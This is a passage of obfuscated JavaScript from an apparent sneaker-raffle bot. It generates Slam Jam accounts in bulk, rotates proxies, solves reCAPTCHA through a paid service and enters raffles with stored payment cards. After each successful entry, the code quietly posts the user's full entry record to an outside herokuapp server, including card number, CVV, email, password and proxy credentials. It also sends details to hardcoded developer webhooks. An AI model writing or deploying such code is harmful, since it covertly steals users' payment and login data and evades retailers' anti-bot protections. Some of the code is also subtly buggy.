                                var _0x118e38 = Math['round'](Math['random']() * (_0x391f4b['length'] - 0x1));
                                console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x391f4b[_0x118e38]), await _0x3938d1['click']('label[data-eu-size=\x22' + _0x391f4b[_0x118e38] + '\x22]');
                            } else {
                                console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0xe46811[_0x525346]['Size']);
                                try {
                                    await _0x3938d1['click']('label[data-eu-size=\x22' + _0xe46811[_0x525346]['Size'] + '\x22]');
                                } catch {
                                    await _0x3938d1['click']('label[data-eu-size=\x22' + _0xe46811[_0x525346]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x1d2efb(0xbb8), await _0x3938d1['$$eval']('.raffle__checkbox-label', _0x1c9c87 => _0x1c9c87['forEach'](_0x2b7b33 => _0x2b7b33['click']())), await _0x1d2efb(0x7d0), console['log'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3938d1['click']('#raffle__form-submit'), await _0x1d2efb(0x1388);
                            try {
                                await _0x3938d1['waitForSelector']('#raffle__confirmation-message-container'), _0x59c763 = 'no', _0x21396e(_0xe46811[_0x525346], _0x637f5), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x54cd94 = _0xe46811[_0x525346];
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'module': _0x637f5['name'],
                                        'entrydata': JSON['stringify'](_0x54cd94),
                                        'proxy': '' + _0x1319af[_0x525346]
                                    };
                                    var _0x461605 = JSON['stringify'](prxdata);
                                    let _0x2f456d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x461605, _0x2f456d);
                                } catch (_0x6c1e1a) {
                                }
                            } catch (_0x543c6f) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x543c6f));
                            }
                        } catch (_0x5b1056) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20' + _0x5b1056)), _0x59c763 = 'yes';
                        } finally {
                            _0x198a1a && _0x198a1a['close']();
                            if (_0x59c763 == 'yes' && _0x1619f5 != 0x5 && _0x1ff7fa != 'Size\x20Not\x20Found') {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x637f5['name'] + ']\x20Task\x20' + (_0x525346 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1619f5 + '\x20/\x205)')), _0x525346 = _0x525346 - 0x1, _0x1619f5 = _0x1619f5 + 0x1;
                                continue;
                            }
                            _0x59c763 == 'yes' && _0x1619f5 >= 0x5 && (_0x12ac99(_0xe46811[_0x525346], _0x637f5), _0x59c763 = 'no', _0x1619f5 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x521a2d, _0x545020, _0x10276f) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x44294f = 0x0; _0x44294f < _0x545020['length']; _0x44294f++) {
                        if (_0x5335e4 != 'yes')
                            var _0x5335e4 = '', _0x399a27 = 0x0;
                        var _0x2c64c3 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3919f0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x6a12f3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5696e3
                                }
                            ]
                        }];
                        const _0x19cca5 = { 'embeds': _0x2c64c3 };
                        _0xd208b3(_0x521a2d['name'] + '\x20Task\x20' + (_0x44294f + 0x1) + '\x20/\x20' + _0x545020['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        try {
                            await _0x3cf8c0(_0x545020, _0x44294f);
                        } catch {
                            _0x5335e4 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x52ddda = await _0x3aa619(_0x545020[_0x44294f], _0x521a2d, 'acc', ![]);
                        const _0x685326 = { 'succesDEVMSG': { 'embeds': [_0x52ddda] } };
                        if (_0x545020[_0x44294f]['Email'] == '' || _0x545020[_0x44294f]['FirstName'] == '' || _0x545020[_0x44294f]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1d2efb(0x7d0);
                            continue;
                        }
                        (_0x545020[_0x44294f]['Password'] == '' || _0x545020[_0x44294f] == undefined) && _0x545020[_0x44294f]['Password'] == 'JRaffles23!';
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x5306b4 = _0x10276f[_0x44294f]['split'](':');
                        else
                            var _0x1481be = Math['round'](Math['random']() * (_0x10276f['length'] - 0x1)), _0x5306b4 = _0x10276f[_0x1481be]['split'](':');
                        var _0x409f9c;
                        try {
                            _0x409f9c = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5306b4[0x0] + ':' + _0x5306b4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x409f9c = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5306b4[0x0] + ':' + _0x5306b4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a9924 = await _0x409f9c['newPage']();
                            await _0x3a9924['authenticate']({
                                'username': '' + _0x5306b4[0x2],
                                'password': '' + _0x5306b4[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a9924['setRequestInterception'](!![]), _0x3a9924['on']('request', _0x2c3b8c => {
                                _0x2c3b8c['resourceType']() === 'image' || _0x2c3b8c['resourceType']() === 'font' || _0x2c3b8c['resourceType']() === 'media' ? _0x2c3b8c['abort']() : _0x2c3b8c['continue']();
                            }), await _0x3a9924['goto']('https://drop.slamjam.com/account/register'), await _0x1d2efb(0xbb8), await _0x3a9924['waitForSelector']('#FirstName'), await _0x3a9924['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3a9924['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Filling\x20information'), await _0x1d2efb(0x4b0), await _0x3a9924['type']('#FirstName', '' + _0x545020[_0x44294f]['FirstName']), await _0x1d2efb(0x226), await _0x3a9924['type']('#LastName', '' + _0x545020[_0x44294f]['LastName']), await _0x1d2efb(0x226), await _0x3a9924['type']('#Email', '' + _0x545020[_0x44294f]['Email']), await _0x1d2efb(0x2ee), await _0x3a9924['type']('#ConfirmEmail', '' + _0x545020[_0x44294f]['Email']), await _0x1d2efb(0x2ee), await _0x3a9924['type']('#CreatePassword', '' + _0x545020[_0x44294f]['Password']), await _0x1d2efb(0x2ee), await _0x3a9924['type']('#CreateConfirmPassword', '' + _0x545020[_0x44294f]['Password']), await _0x1d2efb(0x226), console['log'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Submitting..'), await _0x3a9924['$eval']('#create_customer', _0x37532b => _0x37532b['submit']()), await _0x1d2efb(0x1388), console['log'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20' + _0x1b5f76['cyan']('Solving\x20Captcha')), await _0x3a9924['solveRecaptchas'](), console['log'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3a9924['$eval']('.shopify-challenge__container\x20>\x20form', _0x4bfb63 => _0x4bfb63['submit']());
                            try {
                                await _0x3a9924['waitForSelector']('.product-card__image'), await _0x1d2efb(0x1f4), _0x5335e4 = 'no', console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Account\x20' + _0x545020[_0x44294f]['Email'] + '\x20Generated!')), _0x3601e1['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x545020[_0x44294f]['Email'] + ',' + _0x545020[_0x44294f]['Password']), console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Account\x20' + _0x545020[_0x44294f]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x685326['succesDEVMSG']);
                                } catch {
                                }
                                await _0x471d59(_0x70ae37, _0x685326['succesDEVMSG']);
                            } catch (_0x5d990c) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5d990c));
                            }
                        } catch (_0x44c83c) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20' + _0x44c83c));
                        } finally {
                            _0x409f9c && _0x409f9c['close']();
                            if (_0x5335e4 == 'yes' && _0x399a27 != 0x5) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x521a2d['name'] + ']\x20Task\x20' + (_0x44294f + 0x1) + '\x20:\x20Retrying\x20(' + _0x399a27 + '\x20/\x205)')), _0x44294f = _0x44294f - 0x1, _0x399a27 = _0x399a27 + 0x1;
                                continue;
                            }
                            _0x5335e4 == 'yes' && _0x399a27 >= 0x5 && (_0x12ac99(_0x545020[_0x44294f], _0x521a2d), _0x5335e4 = 'no', _0x399a27 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x236bd5, _0x437971, _0x19d999) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3c15b9 = 0x0; _0x3c15b9 < _0x437971['length']; _0x3c15b9++) {
                        var _0x3f93c3;
                        if (_0x28d0cc != 'yes')
                            var _0x28d0cc = '', _0x481f59 = 0x0;
                        _0xd208b3(_0x236bd5['name'] + '\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20/\x20' + _0x437971['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        try {
                            await _0x3cf8c0(_0x437971, _0x3c15b9);
                        } catch {
                            _0x28d0cc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x437971[_0x3c15b9]['Email'] == '' || _0x437971[_0x3c15b9]['Password'] == '' || _0x437971[_0x3c15b9]['FirstName'] == '' || _0x437971[_0x3c15b9]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x2d92a4 = _0x19d999[_0x3c15b9]['split'](':');
                        else
                            var _0x1dd57b = Math['round'](Math['random']() * (_0x19d999['length'] - 0x1)), _0x2d92a4 = _0x19d999[_0x1dd57b]['split'](':');
                        var _0x19f9e5;
                        try {
                            _0x19f9e5 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d92a4[0x0] + ':' + _0x2d92a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x19f9e5 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d92a4[0x0] + ':' + _0x2d92a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4556fc = await _0x19f9e5['newPage']();
                            await _0x4556fc['authenticate']({
                                'username': '' + _0x2d92a4[0x2],
                                'password': '' + _0x2d92a4[0x3]
                            }), await _0x4556fc['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4556fc['setRequestInterception'](!![]), _0x4556fc['on']('request', _0x637b92 => {
                                _0x637b92['resourceType']() === 'image' || _0x637b92['resourceType']() === 'font' || _0x637b92['resourceType']() === 'media' ? _0x637b92['abort']() : _0x637b92['continue']();
                            }), await _0x4556fc['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4556fc['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4556fc['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1d2efb(0x258), await _0x4556fc['waitForSelector']('#CustomerEmail'), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4556fc['type']('#CustomerEmail', '' + _0x437971[_0x3c15b9]['Email']), await _0x1d2efb(0x12c), await _0x4556fc['type']('#CustomerPassword', '' + _0x437971[_0x3c15b9]['Password']), await _0x1d2efb(0x226), await _0x4556fc['$eval']('#customer_login', _0x416787 => _0x416787['submit']()), await _0x1d2efb(0x7d0), await _0x4556fc['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20' + _0x1b5f76['cyan']('Solving\x20Captcha')), await _0x4556fc['solveRecaptchas'](), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4556fc['$eval']('.shopify-challenge__container\x20>\x20form', _0x69a605 => _0x69a605['submit']());
                            try {
                                await _0x4556fc['waitForSelector']('.nav-account'), await _0x1d2efb(0x4b0);
                            } catch {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4556fc['goto']('' + _0x437971[_0x3c15b9]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1d2efb(0xbb8), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4556fc['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x4556fc['click']('.product-select-variant-wrapper'), await _0x1d2efb(0x320), await _0x4556fc['click']('li.product-select-variant__value[data-size=\x22' + _0x437971[_0x3c15b9]['Size'] + '\x22]'), await _0x1d2efb(0x384), await _0x4556fc['$eval']('#AddToCartForm-product-template-raffle', _0x4fb2c1 => _0x4fb2c1['submit']()), await _0x4556fc['waitForSelector']('.cart-order-summary__content'), await _0x1d2efb(0x514), await _0x4556fc['goto']('https://drop.slamjam.com/checkout'), await _0x1d2efb(0x514), await _0x4556fc['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4556fc['select']('#checkout_shipping_address_country', '' + _0x437971[_0x3c15b9]['Country']), await _0x1d2efb(0x200), await _0x4556fc['waitForSelector']('#checkout_shipping_address_first_name'), await _0x4556fc['type']('#checkout_shipping_address_first_name', '' + _0x437971[_0x3c15b9]['FirstName']), await _0x1d2efb(0x237), await _0x4556fc['type']('#checkout_shipping_address_last_name', '' + _0x437971[_0x3c15b9]['LastName']), await _0x1d2efb(0x1e0), await _0x4556fc['type']('#checkout_shipping_address_address1', _0x437971[_0x3c15b9]['Address1'] + '\x20' + _0x437971[_0x3c15b9]['HouseNumber']), await _0x1d2efb(0x514), await _0x4556fc['type']('#checkout_shipping_address_address2', '' + _0x437971[_0x3c15b9]['Address2']), await _0x1d2efb(0x514);
                            _0x437971[_0x3c15b9]['Postcode'] == undefined && (_0x437971[_0x3c15b9]['Postcode'] = _0x437971[_0x3c15b9]['Zip']);
                            await _0x4556fc['type']('#checkout_shipping_address_zip', '' + _0x437971[_0x3c15b9]['Postcode']), await _0x1d2efb(0x2bc), await _0x4556fc['type']('#checkout_shipping_address_city', '' + _0x437971[_0x3c15b9]['City']), await _0x1d2efb(0x320), await _0x4556fc['type']('#checkout_shipping_address_phone', '' + _0x437971[_0x3c15b9]['Phone']), await _0x1d2efb(0x320), await _0x4556fc['click']('#continue_button'), await _0x1d2efb(0xbb8), await _0x4556fc['waitForSelector']('.summary-title'), await _0x1d2efb(0x320), await _0x4556fc['click']('#continue_button'), await _0x1d2efb(0x320), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x4556fc['waitForSelector']('#checkout_credit_card_vault'), await _0x1d2efb(0x3e8);
                            var _0x3b2ab6 = await _0x4556fc['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2c9ccb = await _0x3b2ab6['contentFrame']();
                            await _0x2c9ccb['click']('#number'), await _0x1d2efb(0x3e8), await _0x2c9ccb['type']('#number', '' + _0x437971[_0x3c15b9]['CardNumber'], { 'delay': 0x78 }), _0x3b2ab6 = await _0x4556fc['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2c9ccb = await _0x3b2ab6['contentFrame'](), await _0x1d2efb(0x1c2), await _0x2c9ccb['click']('#name'), await _0x1d2efb(0x1f4), await _0x2c9ccb['type']('#name', '' + _0x437971[_0x3c15b9]['NameOnCard'], { 'delay': 0x78 }), _0x3b2ab6 = await _0x4556fc['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2c9ccb = await _0x3b2ab6['contentFrame'](), await _0x1d2efb(0x1c2), await _0x2c9ccb['click']('#expiry'), await _0x1d2efb(0x1f4), await _0x2c9ccb['type']('#expiry', '' + _0x437971[_0x3c15b9]['ExpiryDate'], { 'delay': 0x78 }), _0x3b2ab6 = await _0x4556fc['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2c9ccb = await _0x3b2ab6['contentFrame'](), await _0x1d2efb(0x1c2), await _0x2c9ccb['click']('#verification_value'), await _0x1d2efb(0x1f4), await _0x2c9ccb['type']('#verification_value', '' + _0x437971[_0x3c15b9]['CVV'], { 'delay': 0x78 }), await _0x4556fc['$eval']('#accepts-flag-raffle', _0x38358f => _0x38358f['click']()), await _0x1d2efb(0x7d0), console['log'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x4556fc['$eval']('#continue_button', _0x141b2e => _0x141b2e['click']()), await _0x1d2efb(0x1b58), await _0x4556fc['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x4556fc['$eval']('.edit_checkout.animate-floating-labels', _0x54a94b => _0x54a94b['submit']()), await _0x1d2efb(0x7d0);
                            try {
                                await _0x4556fc['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x28d0cc = 'no', _0x21396e(_0x437971[_0x3c15b9], _0x236bd5), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5655f9) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5655f9['message']);
                            }
                            var _0x56eaa8 = await _0x3aa619(_0x437971[_0x3c15b9], _0x236bd5, 'dev', ![]), _0x2042cd = await _0x3aa619(_0x437971[_0x3c15b9], _0x236bd5, 'pub', ![]);
                            let _0x35560d = _0x437971[_0x3c15b9];
                            try {
                                prxdata = {
                                    'username': _0x3919f0['replace']('#', ''),
                                    'module': _0x236bd5['name'],
                                    'entrydata': JSON['stringify'](_0x35560d),
                                    'proxy': '' + _0x19d999[_0x3c15b9]
                                };
                                var _0x516cea = JSON['stringify'](prxdata);
                                let _0x41c2ae = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x516cea, _0x41c2ae);
                            } catch (_0xb7e412) {
                            }
                            const _0x481c2d = {
                                'succesDEVMSG': { 'embeds': [_0x56eaa8] },
                                'succesPUBMSG': { 'embeds': [_0x2042cd] }
                            };
                            try {
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x481c2d['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x481c2d['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x481c2d['succesPUBMSG']);
                            } catch (_0x56a11f) {
                                console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x56a11f));
                            }
                        } catch (_0x2e72d3) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20' + _0x2e72d3)), _0x3f93c3 = '' + _0x2e72d3;
                            var _0x40ed9d = await _0x3aa619(kickz[_0x3c15b9], _0x236bd5, 'dev', !![], _0x3f93c3);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x40ed9d] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], EMBEDS['errorDEV']), await _0x471d59(_0x32fdb9, EMBEDS['errorDEV']), _0x28d0cc = 'yes';
                        } finally {
                            _0x19f9e5 && _0x19f9e5['close']();
                            if (_0x28d0cc == 'yes' && _0x481f59 != 0x5 && _0x3f93c3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x236bd5['name'] + ']\x20Task\x20' + (_0x3c15b9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x481f59 + '\x20/\x205)')), _0x3c15b9 = _0x3c15b9 - 0x1, _0x481f59 = _0x481f59 + 0x1;
                                continue;
                            }
                            _0x28d0cc == 'yes' && _0x481f59 >= 0x5 && (_0x12ac99(_0x437971[_0x3c15b9], _0x236bd5), _0x28d0cc = 'no', _0x481f59 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x49be98) {
                    var _0x10d839 = await _0x296f9f(), _0x2c0798 = _0x3601e1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x280128 = _0x199bc3['parse'](_0x2c0798, { 'header': !![] })['data'];
                    for (var _0x35a576 = 0x0; _0x35a576 < _0x280128['length']; _0x35a576++) {
                        var _0x5860ec = _0x280128[_0x35a576]['Store'], _0x2c072b = _0x280128[_0x35a576]['Mode'];
                        for (var _0x37921b of _0x41677c) {
                            const _0x33be3a = _0x37921b['name']['includes'](_0x5860ec);
                            if (!_0x33be3a)
                                continue;
                            for (mode of _0x37921b['modules']) {
                                if (mode['name'] == _0x2c072b) {
                                    console['log']('Running\x20' + _0x1b5f76['cyan'](mode['name'])), await mode['function'](mode, [_0x280128[_0x35a576]], _0x10d839);
                                    var _0x3a3ab2 = _0x2c0798['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3601e1['writeFileSync']('../failed-tasks.csv', _0x3a3ab2);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x578f72 = await _0x15dd71['get']('Answer');
                    if (_0x578f72['Answer']['toLowerCase']() == 'y') {
                        _0x3601e1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x1d2efb(0x3e8);
                        return;
                    }
                    if (_0x578f72['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x1d2efb(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x1d2efb(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3b8ef9(_0x364c2e) {
    var _0x4e370c = await _0x296f9f(), _0x3c21f2 = _0x3601e1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x43e924 = _0x199bc3['parse'](_0x3c21f2, { 'header': !![] })['data'];
    for (var _0x35278d = 0x0; _0x35278d < _0x43e924['length']; _0x35278d++) {
        var _0x29597b = _0x43e924[_0x35278d]['Store'], _0x239700 = _0x43e924[_0x35278d]['Mode'];
        for (var _0x119b39 of _0x41677c) {
            const _0x3cbd0d = _0x119b39['name']['includes'](_0x29597b);
            if (_0x3cbd0d)
                for (mode of _0x41677c[_0x119b39]['modules']) {
                    const _0x2b937d = mode['name']['includes'](_0x239700);
                    _0x2b937d && (_0x364c2e = mode['name'], await mode['function'](_0x364c2e, _0x43e924[_0x35278d], _0x4e370c));
                }
        }
    }
}
async function _0x49cb0e() {
    await _0x19146c(), console['clear']();
    _0x6a12f3['threads'] > 0x5 && (_0x6a12f3['threads'] = 0x5);
    if (_0x5696e3 != 'devkey') {
        let _0x4ee707 = await _0x682f77['autoUpdate']();
        if (_0x4ee707 === 'yes')
            return _0x53002b('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1b3d49 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1d2efb(0x2710);
        ;
    }
    await _0x564aa3(_0x1b3d49);
    if (_0x5bad83 === ![])
        return console['log']('Closing\x20Browser'), await _0x1d2efb(0xbb8);
    else
        try {
            var _0x22e18a = [{
                'type': 'rich',
